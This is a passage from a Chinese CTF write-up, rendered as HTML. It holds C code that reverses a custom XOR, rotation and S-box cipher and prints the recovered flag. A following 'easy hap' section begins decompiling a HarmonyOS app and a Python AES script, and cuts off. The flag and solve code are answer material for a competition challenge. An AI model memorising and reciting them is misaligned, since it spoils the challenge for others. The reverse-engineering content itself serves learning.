<span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__ROL4__</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">),</span><span class="w"> </span><span class="mi">12</span><span class="p">);</span>
<span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="mi">570619159</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
<span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__ROR4__</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">a2</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">);</span>
<span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">4L</span><span class="n">L</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="n">a2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">270817907</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span><span class="w"> </span><span class="nf">func3_rev</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">26</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="n">i</span><span class="w"> </span><span class="p">)</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
<span class="w">    </span><span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">a1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">sbox</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="mh">0x70</span><span class="p">,</span><span class="w"> </span><span class="mh">0x82</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2C</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEC</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB3</span><span class="p">,</span><span class="w"> </span><span class="mh">0x27</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x85</span><span class="p">,</span><span class="w"> </span><span class="mh">0x57</span><span class="p">,</span><span class="w"> </span><span class="mh">0x35</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEA</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0C</span><span class="p">,</span><span class="w"> </span><span class="mh">0xAE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x23</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEF</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x93</span><span class="p">,</span><span class="w"> </span><span class="mh">0x45</span><span class="p">,</span><span class="w"> </span><span class="mh">0x19</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0xED</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0E</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4E</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x65</span><span class="p">,</span><span class="w"> </span><span class="mh">0x92</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBD</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x86</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xAF</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7C</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEB</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1F</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3E</span><span class="p">,</span><span class="w"> </span><span class="mh">0x30</span><span class="p">,</span><span class="w"> </span><span class="mh">0xDC</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5E</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1A</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0xA6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x39</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCA</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x47</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3D</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5A</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x51</span><span class="p">,</span><span class="w"> </span><span class="mh">0x56</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4D</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x8B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x66</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFB</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x12</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x84</span><span class="p">,</span><span class="w"> </span><span class="mh">0x99</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0xDF</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4C</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCB</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x34</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7E</span><span class="p">,</span><span class="w"> </span><span class="mh">0x76</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6D</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB7</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x17</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD7</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x14</span><span class="p">,</span><span class="w"> </span><span class="mh">0x58</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x61</span><span class="p">,</span><span class="w"> </span><span class="mh">0xDE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x32</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x16</span><span class="p">,</span><span class="w"> </span><span class="mh">0x53</span><span class="p">,</span><span class="w"> </span><span class="mh">0x18</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x22</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0xFE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x44</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCF</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB2</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x91</span><span class="p">,</span><span class="w"> </span><span class="mh">0x24</span><span class="p">,</span><span class="w"> </span><span class="mh">0x08</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x60</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFC</span><span class="p">,</span><span class="w"> </span><span class="mh">0x69</span><span class="p">,</span><span class="w"> </span><span class="mh">0x50</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0xAA</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7D</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x62</span><span class="p">,</span><span class="w"> </span><span class="mh">0x97</span><span class="p">,</span><span class="w"> </span><span class="mh">0x54</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1E</span><span class="p">,</span><span class="w"> </span><span class="mh">0x95</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">,</span><span class="w"> </span><span class="mh">0x64</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD2</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x75</span><span class="p">,</span><span class="w"> </span><span class="mh">0xDB</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xDA</span><span class="p">,</span><span class="w"> </span><span class="mh">0x09</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3F</span><span class="p">,</span><span class="w"> </span><span class="mh">0xDD</span><span class="p">,</span><span class="w"> </span><span class="mh">0x94</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x87</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0x02</span><span class="p">,</span><span class="w"> </span><span class="mh">0xCD</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x33</span><span class="p">,</span><span class="w"> </span><span class="mh">0x73</span><span class="p">,</span><span class="w"> </span><span class="mh">0x67</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF3</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7F</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBF</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE2</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x52</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9B</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x26</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x37</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x81</span><span class="p">,</span><span class="w"> </span><span class="mh">0x96</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x13</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x63</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2E</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0xE9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x79</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6E</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBC</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8E</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF9</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2F</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFD</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x59</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x78</span><span class="p">,</span><span class="w"> </span><span class="mh">0x98</span><span class="p">,</span><span class="w"> </span><span class="mh">0x06</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6A</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x46</span><span class="p">,</span><span class="w"> </span><span class="mh">0x71</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBA</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x25</span><span class="p">,</span><span class="w"> </span><span class="mh">0xAB</span><span class="p">,</span><span class="w"> </span><span class="mh">0x42</span><span class="p">,</span><span class="w"> </span><span class="mh">0x88</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8D</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFA</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x72</span><span class="p">,</span><span class="w"> </span><span class="mh">0x07</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x55</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEE</span><span class="p">,</span><span class="w"> </span><span class="mh">0xAC</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x36</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x38</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF1</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA4</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x40</span><span class="p">,</span><span class="w"> </span><span class="mh">0x28</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD3</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7B</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBB</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x43</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x15</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xAD</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x77</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9E</span>
<span class="p">};</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">sbox_rev</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">ans</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="mh">0xE6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x12</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF9</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF7</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x71</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x92</span><span class="p">,</span><span class="w"> </span><span class="mh">0x91</span><span class="p">,</span><span class="w"> </span><span class="mh">0x67</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x91</span><span class="p">,</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0x13</span><span class="p">,</span><span class="w"> </span><span class="mh">0x73</span><span class="p">,</span>
<span class="w">    </span><span class="mh">0x65</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1E</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x20</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9A</span><span class="p">,</span><span class="w"> </span><span class="mh">0x82</span>
<span class="p">};</span>

<span class="kt">int</span><span class="w"> </span><span class="n">rand_vals</span><span class="p">[</span><span class="mi">21</span><span class="p">];</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">srand</span><span class="p">(</span><span class="mh">0x1337u</span><span class="p">);</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">21</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">rand_vals</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">256</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">sbox_rev</span><span class="p">[</span><span class="n">sbox</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="p">)</span><span class="n">i</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">ans</span><span class="p">,</span><span class="w"> </span><span class="mi">28</span><span class="p">);</span>

<span class="w">    </span><span class="n">func1_rev</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">rand_vals</span><span class="p">[</span><span class="mi">20</span><span class="p">]);</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">19</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">--</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">func3_rev</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">27</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sbox_rev</span><span class="p">[</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">]];</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="n">func2_rev</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">);</span>
<span class="w">        </span><span class="n">func1_rev</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="n">rand_vals</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">27</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>得到 flag <code>ZJUCTF{s0_EaSy_2_gE7_@n$W3R}</code>。</p>
<h3 id="easy-hap">easy hap<a class="headerlink" href="#easy-hap" title="Permanent link">&para;</a></h3>
<p>给了个鸿蒙的 app，直接解压，用 jadx 打开里面的 <code>module.abc</code> 文件，里面 <code>CipherUtil</code> 这个类在做加解密。</p>
<p>是个链式加密，里面的参数传递啥的看不懂，猜了猜然后做出来了。</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="k">def</span><span class="w"> </span><span class="nf">string_to_uint8_array</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
